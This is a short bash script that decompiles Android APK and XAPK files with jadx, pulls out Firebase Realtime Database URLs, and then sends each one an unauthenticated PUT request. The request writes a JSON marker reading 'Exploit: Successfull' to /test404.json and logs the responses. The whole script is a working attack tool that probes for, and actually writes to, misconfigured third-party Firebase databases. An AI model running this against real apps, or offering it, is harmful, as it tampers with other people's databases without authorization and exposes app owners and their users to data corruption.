#!/bin/bash
function firebaseJadx() {
    # Check if any APK files are present
    if [ -z "$(ls *.apk 2>/dev/null)" ] && [ -z "$(ls *.xapk 2>/dev/null)" ]; then
        echo "No APK files found in the current directory."
        return 1
    fi

    # Decompile APK files using jadx
    jadx *.apk
    jadx *.xapk

    # Extract URLs containing 'firebaseio'
    urls=$(grep -w 'firebaseio' -r ./ | grep -Eo 'https?://[^ ]+[^<]*' | sed 's|</string>||g')

    # Check if any URLs were found
    if [ -z "$urls" ]; then
        echo "No URLs containing 'firebaseio' found."
        return 1
    fi

    echo "$urls"
    # JSON data to send
    json_data='{"Exploit":"Successfull", "H4CK": "404"}'

    # Response file to store results
    response_file="all_responses.txt"
    # Loop through each URL and send the request
    while IFS= read -r url; do
        echo "Sending request to: ${url}/test404.json"

        response=$(curl -s -w "%{http_code}" -o response_body.txt -X PUT -H "Content-Type: application/json" -d "$json_data" "${url}/test404.json")

        response_body=$(<response_body.txt)

        echo "URL: $url" >> "$response_file"
        echo "Response Code: $response" >> "$response_file"
        echo "Response Body: $response_body" >> "$response_file"
        echo "----------------------------------------" >> "$response_file"

        echo "Response Code: $response"
        rm response_body.txt
    done <<< "$urls"

    echo "All responses stored in $response_file"
}

